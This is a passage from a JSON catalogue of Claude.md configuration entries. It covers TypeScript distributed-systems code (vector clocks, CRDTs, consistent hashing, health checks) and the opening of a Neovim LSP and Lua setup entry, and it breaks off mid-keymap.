this.clock.forEach((value, key) => {\n      obj[key] = value;\n    });\n    return obj;\n  }\n\n  // Deserialize from JSON\n  static fromJSON(json: Record<string, number>): VectorClock {\n    const clock = new Map<string, number>();\n    Object.entries(json).forEach(([key, value]) => {\n      clock.set(key, value);\n    });\n    return new VectorClock(undefined, clock);\n  }\n\n  toString(): string {\n    const entries = Array.from(this.clock.entries())\n      .sort(([a], [b]) => a.localeCompare(b))\n      .map(([node, time]) => `${node}:${time}`)\n      .join(', ');\n    return `{${entries}}`;\n  }\n}\n\n// Usage example for distributed event ordering\nexport class DistributedEventLog {\n  private events: { id: string; data: any; clock: VectorClock }[] = [];\n  private nodeId: string;\n  private currentClock: VectorClock;\n\n  constructor(nodeId: string) {\n    this.nodeId = nodeId;\n    this.currentClock = new VectorClock(nodeId);\n  }\n\n  // Add a local event\n  addLocalEvent(eventId: string, data: any): void {\n    this.currentClock = this.currentClock.increment(this.nodeId);\n    \n    this.events.push({\n      id: eventId,\n      data,\n      clock: this.currentClock.copy()\n    });\n    \n    console.log(`Added local event ${eventId} with clock ${this.currentClock}`);\n  }\n\n  // Receive a remote event\n  receiveRemoteEvent(eventId: string, data: any, remoteClock: VectorClock): void {\n    this.currentClock = this.currentClock.update(remoteClock, this.nodeId);\n    \n    this.events.push({\n      id: eventId,\n      data,\n      clock: remoteClock.copy()\n    });\n    \n    console.log(`Received remote event ${eventId} with clock ${remoteClock}`);\n    console.log(`Updated local clock to ${this.currentClock}`);\n  }\n\n  // Get events in causal order\n  getCausallyOrderedEvents(): { id: string; data: any; clock: VectorClock }[] {\n    return this.events.sort((a, b) => {\n      const comparison = a.clock.compareTo(b.clock);\n      switch (comparison) {\n        case 'before': return -1;\n        case 'after': return 1;\n        case 'equal': return 0;\n        case 'concurrent': \n          // For concurrent events, order by event ID for deterministic ordering\n          return a.id.localeCompare(b.id);\n      }\n    });\n  }\n\n  getCurrentClock(): VectorClock {\n    return this.currentClock.copy();\n  }\n}\n```\n\n## Distributed Data Structures\n\n### Conflict-Free Replicated Data Types (CRDTs)\n```typescript\n// src/consistency/eventual/CRDTs.ts\n\n// G-Counter: Grow-only counter CRDT\nexport class GCounter {\n  private counters: Map<string, number> = new Map();\n\n  constructor(private nodeId: string) {}\n\n  // Increment the counter\n  increment(amount: number = 1): void {\n    const current = this.counters.get(this.nodeId) || 0;\n    this.counters.set(this.nodeId, current + amount);\n  }\n\n  // Get the current value\n  value(): number {\n    let total = 0;\n    this.counters.forEach(count => total += count);\n    return total;\n  }\n\n  // Merge with another G-Counter\n  merge(other: GCounter): GCounter {\n    const merged = new GCounter(this.nodeId);\n    \n    // Get all node IDs from both counters\n    const allNodes = new Set([...this.counters.keys(), ...other.counters.keys()]);\n    \n    // For each node, take the maximum value\n    allNodes.forEach(nodeId => {\n      const myValue = this.counters.get(nodeId) || 0;\n      const otherValue = other.counters.get(nodeId) || 0;\n      merged.counters.set(nodeId, Math.max(myValue, otherValue));\n    });\n    \n    return merged;\n  }\n\n  // Compare with another counter\n  compare(other: GCounter): 'less' | 'greater' | 'concurrent' | 'equal' {\n    const allNodes = new Set([...this.counters.keys(), ...other.counters.keys()]);\n    \n    let thisLess = false;\n    let thisGreater = false;\n    \n    for (const nodeId of allNodes) {\n      const myValue = this.counters.get(nodeId) || 0;\n      const otherValue = other.counters.get(nodeId) || 0;\n      \n      if (myValue < otherValue) {\n        thisLess = true;\n      } else if (myValue > otherValue) {\n        thisGreater = true;\n      }\n    }\n    \n    if (thisLess && !thisGreater) return 'less';\n    if (!thisLess && thisGreater) return 'greater';\n    if (!thisLess && !thisGreater) return 'equal';\n    return 'concurrent';\n  }\n\n  toJSON(): Record<string, number> {\n    const obj: Record<string, number> = {};\n    this.counters.forEach((value, key) => {\n      obj[key] = value;\n    });\n    return obj;\n  }\n\n  static fromJSON(nodeId: string, json: Record<string, number>): GCounter {\n    const counter = new GCounter(nodeId);\n    Object.entries(json).forEach(([key, value]) => {\n      counter.counters.set(key, value);\n    });\n    return counter;\n  }\n}\n\n// OR-Set: Observed-Remove Set CRDT\nexport class ORSet<T> {\n  private elements: Map<T, Set<string>> = new Map(); // element -> set of unique tags\n  private removed: Set<string> = new Set(); // set of removed tags\n\n  constructor(private nodeId: string) {}\n\n  // Add an element\n  add(element: T): void {\n    const tag = `${this.nodeId}-${Date.now()}-${Math.random()}`;\n    \n    if (!this.elements.has(element)) {\n      this.elements.set(element, new Set());\n    }\n    \n    this.elements.get(element)!.add(tag);\n  }\n\n  // Remove an element\n  remove(element: T): void {\n    const tags = this.elements.get(element);\n    if (tags) {\n      tags.forEach(tag => this.removed.add(tag));\n    }\n  }\n\n  // Check if element is in the set\n  has(element: T): boolean {\n    const tags = this.elements.get(element);\n    if (!tags) return false;\n    \n    // Element is present if it has at least one tag that hasn't been removed\n    return Array.from(tags).some(tag => !this.removed.has(tag));\n  }\n\n  // Get all elements in the set\n  values(): T[] {\n    const result: T[] = [];\n    \n    this.elements.forEach((tags, element) => {\n      if (Array.from(tags).some(tag => !this.removed.has(tag))) {\n        result.push(element);\n      }\n    });\n    \n    return result;\n  }\n\n  // Merge with another OR-Set\n  merge(other: ORSet<T>): ORSet<T> {\n    const merged = new ORSet<T>(this.nodeId);\n    \n    // Merge elements\n    const allElements = new Set([...this.elements.keys(), ...other.elements.keys()]);\n    \n    allElements.forEach(element => {\n      const myTags = this.elements.get(element) || new Set();\n      const otherTags = other.elements.get(element) || new Set();\n      \n      merged.elements.set(element, new Set([...myTags, ...otherTags]));\n    });\n    \n    // Merge removed tags\n    merged.removed = new Set([...this.removed, ...other.removed]);\n    \n    return merged;\n  }\n\n  size(): number {\n    return this.values().length;\n  }\n\n  isEmpty(): boolean {\n    return this.size() === 0;\n  }\n}\n\n// LWW-Register: Last-Write-Wins Register CRDT\nexport class LWWRegister<T> {\n  private value: T | undefined;\n  private timestamp: number = 0;\n  private nodeId: string;\n\n  constructor(nodeId: string, initialValue?: T) {\n    this.nodeId = nodeId;\n    if (initialValue !== undefined) {\n      this.setValue(initialValue);\n    }\n  }\n\n  // Set a new value\n  setValue(value: T, timestamp?: number): void {\n    const ts = timestamp || Date.now();\n    \n    if (ts > this.timestamp || (ts === this.timestamp && this.nodeId > this.getValueNodeId())) {\n      this.value = value;\n      this.timestamp = ts;\n    }\n  }\n\n  // Get the current value\n  getValue(): T | undefined {\n    return this.value;\n  }\n\n  // Get the timestamp of the current value\n  getTimestamp(): number {\n    return this.timestamp;\n  }\n\n  // Merge with another LWW-Register\n  merge(other: LWWRegister<T>): LWWRegister<T> {\n    const merged = new LWWRegister<T>(this.nodeId);\n    \n    if (this.timestamp > other.timestamp || \n        (this.timestamp === other.timestamp && this.nodeId > other.nodeId)) {\n      merged.value = this.value;\n      merged.timestamp = this.timestamp;\n    } else {\n      merged.value = other.value;\n      merged.timestamp = other.timestamp;\n    }\n    \n    return merged;\n  }\n\n  private getValueNodeId(): string {\n    return this.nodeId; // Simplified - in practice, you'd store the node ID with each write\n  }\n}\n```\n\n## Load Balancing and Service Discovery\n\n### Consistent Hashing Implementation\n```typescript\n// src/load-balancing/consistent-hashing/ConsistentHashing.ts\nimport { createHash } from 'crypto';\n\nexport interface Node {\n  id: string;\n  address: string;\n  weight?: number;\n}\n\nexport class ConsistentHashing {\n  private ring: Map<number, Node> = new Map();\n  private virtualNodes: number;\n  private hashRing: number[] = [];\n\n  constructor(virtualNodes: number = 150) {\n    this.virtualNodes = virtualNodes;\n  }\n\n  // Add a node to the hash ring\n  addNode(node: Node): void {\n    const weight = node.weight || 1;\n    const virtualNodeCount = this.virtualNodes * weight;\n\n    for (let i = 0; i < virtualNodeCount; i++) {\n      const virtualNodeKey = `${node.id}:${i}`;\n      const hash = this.hash(virtualNodeKey);\n      this.ring.set(hash, node);\n    }\n\n    this.updateHashRing();\n    console.log(`Added node ${node.id} with ${virtualNodeCount} virtual nodes`);\n  }\n\n  // Remove a node from the hash ring\n  removeNode(nodeId: string): void {\n    const toRemove: number[] = [];\n    \n    this.ring.forEach((node, hash) => {\n      if (node.id === nodeId) {\n        toRemove.push(hash);\n      }\n    });\n\n    toRemove.forEach(hash => this.ring.delete(hash));\n    this.updateHashRing();\n    \n    console.log(`Removed node ${nodeId}`);\n  }\n\n  // Get the node responsible for a given key\n  getNode(key: string): Node | null {\n    if (this.ring.size === 0) {\n      return null;\n    }\n\n    const hash = this.hash(key);\n    \n    // Find the first node with hash >= key hash\n    let nodeHash = this.findNextNode(hash);\n    if (nodeHash === -1) {\n      // Wrap around to the first node\n      nodeHash = this.hashRing[0];\n    }\n\n    return this.ring.get(nodeHash) || null;\n  }\n\n  // Get multiple nodes for replication\n  getNodes(key: string, count: number): Node[] {\n    if (this.ring.size === 0 || count <= 0) {\n      return [];\n    }\n\n    const hash = this.hash(key);\n    const nodes: Node[] = [];\n    const uniqueNodes = new Set<string>();\n    let currentIndex = this.findNextNodeIndex(hash);\n\n    while (nodes.length < count && nodes.length < this.getUniqueNodeCount()) {\n      if (currentIndex === -1) {\n        currentIndex = 0;\n      }\n\n      const nodeHash = this.hashRing[currentIndex];\n      const node = this.ring.get(nodeHash);\n\n      if (node && !uniqueNodes.has(node.id)) {\n        nodes.push(node);\n        uniqueNodes.add(node.id);\n      }\n\n      currentIndex = (currentIndex + 1) % this.hashRing.length;\n    }\n\n    return nodes;\n  }\n\n  // Get load distribution statistics\n  getLoadDistribution(keys: string[]): Map<string, number> {\n    const distribution = new Map<string, number>();\n    \n    // Initialize all nodes with 0\n    const uniqueNodes = new Set<string>();\n    this.ring.forEach(node => uniqueNodes.add(node.id));\n    uniqueNodes.forEach(nodeId => distribution.set(nodeId, 0));\n\n    // Count key assignments\n    keys.forEach(key => {\n      const node = this.getNode(key);\n      if (node) {\n        distribution.set(node.id, (distribution.get(node.id) || 0) + 1);\n      }\n    });\n\n    return distribution;\n  }\n\n  // Analyze load balance quality\n  analyzeLoadBalance(keys: string[]): {\n    distribution: Map<string, number>;\n    standardDeviation: number;\n    maxDeviation: number;\n    isBalanced: boolean;\n  } {\n    const distribution = this.getLoadDistribution(keys);\n    const counts = Array.from(distribution.values());\n    const mean = counts.reduce((sum, count) => sum + count, 0) / counts.length;\n    \n    const variance = counts.reduce((sum, count) => sum + Math.pow(count - mean, 2), 0) / counts.length;\n    const standardDeviation = Math.sqrt(variance);\n    const maxDeviation = Math.max(...counts.map(count => Math.abs(count - mean)));\n    \n    // Consider balanced if standard deviation is less than 10% of mean\n    const isBalanced = standardDeviation < (mean * 0.1);\n\n    return {\n      distribution,\n      standardDeviation,\n      maxDeviation,\n      isBalanced\n    };\n  }\n\n  private hash(key: string): number {\n    return parseInt(createHash('md5').update(key).digest('hex').substring(0, 8), 16);\n  }\n\n  private updateHashRing(): void {\n    this.hashRing = Array.from(this.ring.keys()).sort((a, b) => a - b);\n  }\n\n  private findNextNode(hash: number): number {\n    for (const nodeHash of this.hashRing) {\n      if (nodeHash >= hash) {\n        return nodeHash;\n      }\n    }\n    return -1; // Not found, should wrap around\n  }\n\n  private findNextNodeIndex(hash: number): number {\n    for (let i = 0; i < this.hashRing.length; i++) {\n      if (this.hashRing[i] >= hash) {\n        return i;\n      }\n    }\n    return -1; // Not found, should wrap around\n  }\n\n  private getUniqueNodeCount(): number {\n    const uniqueNodes = new Set<string>();\n    this.ring.forEach(node => uniqueNodes.add(node.id));\n    return uniqueNodes.size;\n  }\n\n  // Get current ring statistics\n  getRingStats(): {\n    totalVirtualNodes: number;\n    uniqueNodes: number;\n    ringSize: number;\n    nodes: Node[];\n  } {\n    const uniqueNodes = new Set<string>();\n    const nodeMap = new Map<string, Node>();\n    \n    this.ring.forEach(node => {\n      uniqueNodes.add(node.id);\n      nodeMap.set(node.id, node);\n    });\n\n    return {\n      totalVirtualNodes: this.ring.size,\n      uniqueNodes: uniqueNodes.size,\n      ringSize: this.hashRing.length,\n      nodes: Array.from(nodeMap.values())\n    };\n  }\n\n  // Visualize the ring (for debugging)\n  visualizeRing(): string {\n    const visualization: string[] = [];\n    \n    this.hashRing.forEach(hash => {\n      const node = this.ring.get(hash);\n      visualization.push(`${hash}: ${node?.id}`);\n    });\n\n    return visualization.join('\\n');\n  }\n}\n```\n\n## Monitoring and Observability\n\n### Distributed System Health Monitoring\n```typescript\n// src/monitoring/health-checks/SystemHealthMonitor.ts\nexport interface HealthCheck {\n  name: string;\n  check: () => Promise<HealthStatus>;\n  timeout: number;\n  interval: number;\n}\n\nexport interface HealthStatus {\n  status: 'healthy' | 'degraded' | 'unhealthy';\n  details?: any;\n  timestamp: number;\n  responseTime: number;\n}\n\nexport interface SystemHealth {\n  overall: 'healthy' | 'degraded' | 'unhealthy';\n  checks: Map<string, HealthStatus>;\n  lastUpdated: number;\n}\n\nexport class SystemHealthMonitor {\n  private healthChecks: Map<string, HealthCheck> = new Map();\n  private healthStatus: Map<string, HealthStatus> = new Map();\n  private intervals: Map<string, NodeJS.Timeout> = new Map();\n  private isRunning: boolean = false;\n\n  // Register a health check\n  registerCheck(check: HealthCheck): void {\n    this.healthChecks.set(check.name, check);\n    console.log(`Registered health check: ${check.name}`);\n  }\n\n  // Start monitoring\n  start(): void {\n    if (this.isRunning) {\n      return;\n    }\n\n    this.isRunning = true;\n    \n    this.healthChecks.forEach((check, name) => {\n      this.runHealthCheck(name);\n      \n      const interval = setInterval(() => {\n        this.runHealthCheck(name);\n      }, check.interval);\n      \n      this.intervals.set(name, interval);\n    });\n\n    console.log('System health monitoring started');\n  }\n\n  // Stop monitoring\n  stop(): void {\n    this.intervals.forEach(interval => clearInterval(interval));\n    this.intervals.clear();\n    this.isRunning = false;\n    console.log('System health monitoring stopped');\n  }\n\n  // Get current system health\n  getSystemHealth(): SystemHealth {\n    const overall = this.calculateOverallHealth();\n    \n    return {\n      overall,\n      checks: new Map(this.healthStatus),\n      lastUpdated: Date.now()\n    };\n  }\n\n  // Get health status for a specific check\n  getCheckHealth(checkName: string): HealthStatus | null {\n    return this.healthStatus.get(checkName) || null;\n  }\n\n  // Run a specific health check manually\n  async runHealthCheck(checkName: string): Promise<HealthStatus> {\n    const check = this.healthChecks.get(checkName);\n    if (!check) {\n      throw new Error(`Health check '${checkName}' not found`);\n    }\n\n    const startTime = Date.now();\n    \n    try {\n      const timeoutPromise = new Promise<HealthStatus>((_, reject) => {\n        setTimeout(() => reject(new Error('Health check timeout')), check.timeout);\n      });\n\n      const checkPromise = check.check();\n      const result = await Promise.race([checkPromise, timeoutPromise]);\n      \n      const responseTime = Date.now() - startTime;\n      const status: HealthStatus = {\n        ...result,\n        timestamp: Date.now(),\n        responseTime\n      };\n\n      this.healthStatus.set(checkName, status);\n      return status;\n      \n    } catch (error) {\n      const responseTime = Date.now() - startTime;\n      const status: HealthStatus = {\n        status: 'unhealthy',\n        details: { error: error.message },\n        timestamp: Date.now(),\n        responseTime\n      };\n\n      this.healthStatus.set(checkName, status);\n      return status;\n    }\n  }\n\n  private calculateOverallHealth(): 'healthy' | 'degraded' | 'unhealthy' {\n    if (this.healthStatus.size === 0) {\n      return 'unhealthy';\n    }\n\n    let healthyCount = 0;\n    let degradedCount = 0;\n    let unhealthyCount = 0;\n\n    this.healthStatus.forEach(status => {\n      switch (status.status) {\n        case 'healthy':\n          healthyCount++;\n          break;\n        case 'degraded':\n          degradedCount++;\n          break;\n        case 'unhealthy':\n          unhealthyCount++;\n          break;\n      }\n    });\n\n    // If any critical checks are unhealthy, system is unhealthy\n    if (unhealthyCount > 0) {\n      return 'unhealthy';\n    }\n\n    // If any checks are degraded, system is degraded\n    if (degradedCount > 0) {\n      return 'degraded';\n    }\n\n    return 'healthy';\n  }\n}\n\n// Example health checks\nexport class CommonHealthChecks {\n  static database(connectionPool: any): HealthCheck {\n    return {\n      name: 'database',\n      timeout: 5000,\n      interval: 30000,\n      check: async (): Promise<HealthStatus> => {\n        const startTime = Date.now();\n        \n        try {\n          await connectionPool.query('SELECT 1');\n          return {\n            status: 'healthy',\n            timestamp: Date.now(),\n            responseTime: Date.now() - startTime\n          };\n        } catch (error) {\n          return {\n            status: 'unhealthy',\n            details: { error: error.message },\n            timestamp: Date.now(),\n            responseTime: Date.now() - startTime\n          };\n        }\n      }\n    };\n  }\n\n  static externalService(serviceUrl: string): HealthCheck {\n    return {\n      name: `external-service-${serviceUrl}`,\n      timeout: 10000,\n      interval: 60000,\n      check: async (): Promise<HealthStatus> => {\n        const startTime = Date.now();\n        \n        try {\n          const response = await fetch(`${serviceUrl}/health`);\n          const responseTime = Date.now() - startTime;\n          \n          if (response.ok) {\n            return {\n              status: 'healthy',\n              timestamp: Date.now(),\n              responseTime\n            };\n          } else {\n            return {\n              status: 'degraded',\n              details: { statusCode: response.status, statusText: response.statusText },\n              timestamp: Date.now(),\n              responseTime\n            };\n          }\n        } catch (error) {\n          return {\n            status: 'unhealthy',\n            details: { error: error.message },\n            timestamp: Date.now(),\n            responseTime: Date.now() - startTime\n          };\n        }\n      }\n    };\n  }\n\n  static memory(): HealthCheck {\n    return {\n      name: 'memory',\n      timeout: 1000,\n      interval: 15000,\n      check: async (): Promise<HealthStatus> => {\n        const memUsage = process.memoryUsage();\n        const freeMemory = memUsage.heapTotal - memUsage.heapUsed;\n        const memoryUsagePercent = (memUsage.heapUsed / memUsage.heapTotal) * 100;\n\n        let status: 'healthy' | 'degraded' | 'unhealthy';\n        \n        if (memoryUsagePercent > 90) {\n          status = 'unhealthy';\n        } else if (memoryUsagePercent > 75) {\n          status = 'degraded';\n        } else {\n          status = 'healthy';\n        }\n\n        return {\n          status,\n          details: {\n            heapUsed: memUsage.heapUsed,\n            heapTotal: memUsage.heapTotal,\n            freeMemory,\n            usagePercent: memoryUsagePercent\n          },\n          timestamp: Date.now(),\n          responseTime: 0\n        };\n      }\n    };\n  }\n\n  static diskSpace(path: string = '/'): HealthCheck {\n    return {\n      name: 'disk-space',\n      timeout: 2000,\n      interval: 60000,\n      check: async (): Promise<HealthStatus> => {\n        try {\n          const fs = require('fs');\n          const stats = fs.statSync(path);\n          \n          // This is a simplified example - you'd use a proper disk space check\n          const freeSpace = 1000000000; // Placeholder\n          const totalSpace = 10000000000; // Placeholder\n          const usagePercent = ((totalSpace - freeSpace) / totalSpace) * 100;\n\n          let status: 'healthy' | 'degraded' | 'unhealthy';\n          \n          if (usagePercent > 95) {\n            status = 'unhealthy';\n          } else if (usagePercent > 85) {\n            status = 'degraded';\n          } else {\n            status = 'healthy';\n          }\n\n          return {\n            status,\n            details: {\n              path,\n              freeSpace,\n              totalSpace,\n              usagePercent\n            },\n            timestamp: Date.now(),\n            responseTime: 0\n          };\n        } catch (error) {\n          return {\n            status: 'unhealthy',\n            details: { error: error.message },\n            timestamp: Date.now(),\n            responseTime: 0\n          };\n        }\n      }\n    };\n  }\n}\n```\n\n## Performance Optimization Strategies\n\n### Caching Strategies\n- **Multi-level Caching**: L1 (in-memory), L2 (Redis), L3 (database)\n- **Cache Coherence**: Maintain consistency across cache layers\n- **Cache Warming**: Proactive cache population\n- **Cache Invalidation**: Event-driven cache invalidation patterns\n\n### Data Partitioning\n- **Horizontal Partitioning**: Shard data across nodes\n- **Vertical Partitioning**: Split tables by columns\n- **Functional Partitioning**: Separate by feature/domain\n\n### Load Distribution\n- **Geographic Distribution**: Route requests to nearest data center\n- **Read Replicas**: Scale read operations across replicas\n- **Write Sharding**: Distribute writes across multiple masters\n\nThis comprehensive distributed systems design provides the foundation for building resilient, scalable applications that can handle the complexities of distributed computing while maintaining consistency, availability, and partition tolerance according to your specific requirements.",
      "tags": [
        {
          "tag": {
            "id": "distributed-systems",
            "name": "distributed-systems",
            "slug": "distributed-systems"
          }
        },
        {
          "tag": {
            "id": "consistency",
            "name": "consistency",
            "slug": "consistency"
          }
        },
        {
          "tag": {
            "id": "fault-tolerance",
            "name": "fault-tolerance",
            "slug": "fault-tolerance"
          }
        },
        {
          "tag": {
            "id": "consensus",
            "name": "consensus",
            "slug": "consensus"
          }
        },
        {
          "tag": {
            "id": "scalability",
            "name": "scalability",
            "slug": "scalability"
          }
        },
        {
          "tag": {
            "id": "cap-theorem",
            "name": "cap-theorem",
            "slug": "cap-theorem"
          }
        },
        {
          "tag": {
            "id": "resilience",
            "name": "resilience",
            "slug": "resilience"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 55,
        "copies": 68
      },
      "_count": {
        "votes": 36,
        "copies": 130
      },
      "difficulty": "ADVANCED",
      "language": "Multiple",
      "framework": "Distributed Systems Patterns",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "neovim-lsp-ultimate",
      "title": "Neovim LSP Ultimate Setup",
      "slug": "neovim-lsp-ultimate-configuration",
      "tagline": "Neovim + LSP configuration for advanced developers",
      "description": "Comprehensive Neovim configuration with LSP, Treesitter, Telescope, and advanced productivity features for power users and developers seeking the ultimate text editing experience.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Neovim LSP Ultimate Setup\n\n## Project Overview\n\nThis is an advanced Neovim configuration designed for power users and developers who demand the ultimate text editing experience. It features comprehensive LSP support, advanced Treesitter parsing, fuzzy finding with Telescope, and a highly optimized workflow for maximum productivity.\n\n## Development Philosophy\n\n### Neovim Advantages\n1. **Performance**: Lightning-fast startup and operation\n2. **Extensibility**: Lua-based configuration and plugins\n3. **LSP Integration**: Native Language Server Protocol support\n4. **Asynchronous**: Non-blocking operations for smooth experience\n5. **Customization**: Complete control over every aspect\n6. **Vim Compatibility**: All Vim knowledge transfers\n\n### Advanced Features\n- Multi-language LSP with zero-config setup\n- Intelligent code completion and diagnostics\n- Advanced syntax highlighting with Treesitter\n- Fuzzy finding for files, buffers, and symbols\n- Git integration with signs and blame\n- File explorer with icons and previews\n- Terminal integration and floating windows\n- Session management and workspace persistence\n- Custom keybindings and leader key shortcuts\n\n## Technology Stack\n\n- **Editor**: Neovim 0.9+\n- **Configuration Language**: Lua\n- **Plugin Manager**: lazy.nvim\n- **LSP**: Mason + nvim-lspconfig\n- **Completion**: nvim-cmp with multiple sources\n- **Syntax**: nvim-treesitter\n- **Fuzzy Finding**: telescope.nvim\n- **File Explorer**: nvim-tree.lua\n- **Git Integration**: gitsigns.nvim\n- **Status Line**: lualine.nvim\n\n## Project Structure\n\n```\n~/.config/nvim/\n├── init.lua                    # Main configuration entry point\n├── lua/\n│   ├── core/                   # Core Neovim settings\n│   │   ├── options.lua         # Vim options and settings\n│   │   ├── keymaps.lua         # Key mappings and shortcuts\n│   │   ├── autocmds.lua        # Auto commands and events\n│   │   └── utils.lua           # Utility functions\n│   ├── plugins/                # Plugin configurations\n│   │   ├── init.lua            # Plugin manager setup\n│   │   ├── lsp/                # LSP configurations\n│   │   │   ├── mason.lua       # LSP installer\n│   │   │   ├── lspconfig.lua   # LSP server configs\n│   │   │   ├── handlers.lua    # LSP handlers\n│   │   │   └── servers/        # Individual server configs\n│   │   ├── completion/         # Completion setup\n│   │   │   ├── nvim-cmp.lua    # Main completion engine\n│   │   │   └── snippets.lua    # Snippet configurations\n│   │   ├── ui/                 # UI enhancements\n│   │   │   ├── telescope.lua   # Fuzzy finder\n│   │   │   ├── nvim-tree.lua   # File explorer\n│   │   │   ├── lualine.lua     # Status line\n│   │   │   └── bufferline.lua  # Buffer tabs\n│   │   ├── editor/             # Editor enhancements\n│   │   │   ├── treesitter.lua  # Syntax highlighting\n│   │   │   ├── gitsigns.lua    # Git integration\n│   │   │   ├── comment.lua     # Smart commenting\n│   │   │   └── autopairs.lua   # Auto bracket pairing\n│   │   └── tools/              # Development tools\n│   │       ├── terminal.lua    # Terminal integration\n│   │       ├── debugger.lua    # DAP debugging\n│   │       └── testing.lua     # Test integration\n│   └── themes/                 # Color schemes\n│       ├── catppuccin.lua      # Catppuccin theme\n│       └── tokyonight.lua      # Tokyo Night theme\n└── snippets/                   # Custom snippets\n    ├── typescript.json         # TypeScript snippets\n    ├── python.json             # Python snippets\n    └── go.json                 # Go snippets\n```\n\n## Core Configuration\n\n### Main Init File\n```lua\n-- ~/.config/nvim/init.lua\n-- Bootstrap lazy.nvim plugin manager\nlocal lazypath = vim.fn.stdpath(\"data\") .. \"/lazy/lazy.nvim\"\nif not vim.loop.fs_stat(lazypath) then\n  vim.fn.system({\n    \"git\",\n    \"clone\",\n    \"--filter=blob:none\",\n    \"https://github.com/folke/lazy.nvim.git\",\n    \"--branch=stable\",\n    lazypath,\n  })\nend\nvim.opt.rtp:prepend(lazypath)\n\n-- Load core configuration\nrequire(\"core.options\")\nrequire(\"core.keymaps\")\nrequire(\"core.autocmds\")\n\n-- Setup plugins\nrequire(\"plugins\")\n\n-- Set colorscheme\nvim.cmd.colorscheme(\"catppuccin-mocha\")\n```\n\n### Core Options\n```lua\n-- ~/.config/nvim/lua/core/options.lua\nlocal opt = vim.opt\n\n-- General\nopt.mouse = \"a\"                 -- enable mouse support\nopt.clipboard = \"unnamedplus\"   -- use system clipboard\nopt.swapfile = false           -- disable swap files\nopt.completeopt = \"menu,menuone,noselect\"\n\n-- UI\nopt.number = true              -- show line numbers\nopt.relativenumber = true      -- show relative line numbers\nopt.cursorline = true          -- highlight current line\nopt.termguicolors = true       -- true color support\nopt.background = \"dark\"        -- dark background\nopt.signcolumn = \"yes\"         -- always show sign column\nopt.cmdheight = 1             -- command line height\nopt.scrolloff = 8             -- keep 8 lines above/below cursor\nopt.sidescrolloff = 8         -- keep 8 columns left/right of cursor\n\n-- Splitting\nopt.splitright = true         -- vertical splits to the right\nopt.splitbelow = true         -- horizontal splits below\n\n-- Search\nopt.ignorecase = true         -- ignore case in search\nopt.smartcase = true          -- case sensitive if uppercase present\nopt.hlsearch = false          -- don't highlight search results\nopt.incsearch = true          -- incremental search\n\n-- Indentation\nopt.expandtab = true          -- use spaces instead of tabs\nopt.shiftwidth = 2            -- shift 2 spaces when tab\nopt.tabstop = 2               -- 1 tab == 2 spaces\nopt.softtabstop = 2           -- 2 spaces for editing\nopt.smartindent = true        -- autoindent new lines\n\n-- Performance\nopt.updatetime = 250          -- faster completion (4000ms default)\nopt.timeoutlen = 500         -- time to wait for mapped sequence\nopt.redrawtime = 10000       -- allow more time for loading syntax on large files\nopt.synmaxcol = 180          -- max column for syntax highlight\n\n-- Backup and undo\nopt.backup = false            -- don't create backup files\nopt.writebackup = false       -- don't create backup before overwriting\nopt.undofile = true           -- persistent undo\nopt.undodir = vim.fn.expand(\"~/.config/nvim/undo\")\n\n-- Create undo directory if it doesn't exist\nlocal undo_dir = vim.fn.expand(\"~/.config/nvim/undo\")\nif vim.fn.isdirectory(undo_dir) == 0 then\n  vim.fn.mkdir(undo_dir, \"p\")\nend\n\n-- Folding\nopt.foldmethod = \"expr\"\nopt.foldexpr = \"nvim_treesitter#foldexpr()\"\nopt.foldenable = false        -- don't fold by default\n\n-- Window\nopt.winwidth = 30\nopt.winminwidth = 10\nopt.equalalways = false\n\n-- Wild menu\nopt.wildmenu = true\nopt.wildmode = \"longest:full,full\"\nopt.wildignore:append({ \"*.o\", \"*.obj\", \".git\", \"*.rbc\", \"*.pyc\", \"__pycache__\" })\n\n-- Neovim specific\nif vim.fn.has(\"nvim-0.8\") == 1 then\n  opt.backup = false\n  opt.cmdheight = 0\n  opt.laststatus = 3\nend\n```\n\n### Key Mappings\n```lua\n-- ~/.config/nvim/lua/core/keymaps.lua\nlocal keymap = vim.keymap.set\nlocal opts = { noremap = true, silent = true }\n\n-- Set leader key\nvim.g.mapleader = \" \"\nvim.g.maplocalleader = \" \"\n\n-- General keymaps\nkeymap(\"n\", \"<leader>w\", \":w<CR>\", opts)\nkeymap(\"n\", \"<leader>q\", \":q<CR>\", opts)\nkeymap(\"n\", \"<leader>x\", \":x<CR>\", opts)\n\n-- Better window navigation\nkeymap(\"n\", \"<C-h>\", \"<C-w>h\", opts)\nkeymap(\"n\", \"<C-j>\", \"<C-w>j\", opts)\nkeymap(\"n\", \"<C-k>\", \"<C-w>k\", opts)\nkeymap(\"n\", \"<C-l>\", \"<C-w>l\", opts)\n\n-- Resize windows\nkeymap(\"n\", \"<C-Up>\", \":resize -2<CR>\", opts)\nkeymap(\"n\", \"<C-Down>\", \":resize +2<CR>\", opts)\nkeymap(\"n\", \"<C-Left>\", \":vertical resize -2<CR>\", opts)\nkeymap(\"n\", \"<C-Right>\", \":vertical resize +2<CR>\", opts)\n\n-- Buffer navigation\nkeymap(\"n\", \"<S-l>\", \":bnext<CR>\", opts)\nkeymap(\"n\", \"<S-h>\", \":bprevious<CR>\", opts)\nkeymap(\"n\", \"<leader>bd\", \":bdelete<CR>\", opts)\n\n-- Better indenting\nkeymap(\"v\", \"<\", \"<gv\", opts)\nkeymap(\"v\", \">\", \">gv\", opts)\n\n-- Move text up and down\nkeymap(\"v\", \"<A-j>\", \":m .+1<CR>==\", opts)\nkeymap(\"v\", \"<A-k>\", \":m .-2<CR>==\", opts)\nkeymap(\"v\", \"p\", '\"_dP', opts)\n\n-- Visual Block mode\nkeymap(\"x\", \"J\", \":move '>+1<CR>gv-gv\", opts)\nkeymap(\"x\", \"K\", \":move '<-2<CR>gv-gv\", opts)\nkeymap(\"x\", \"<A-j>\", \":move '>+1<CR>gv-gv\", opts)\nkeymap(\"x\", \"<A-k>\", \":move '<-2<CR>gv-gv\", opts)\n\n-- Stay in the center\nkeymap(\"n\", \"<C-d>\", \"<C-d>zz\", opts)\nkeymap(\"n\", \"<C-u>\", 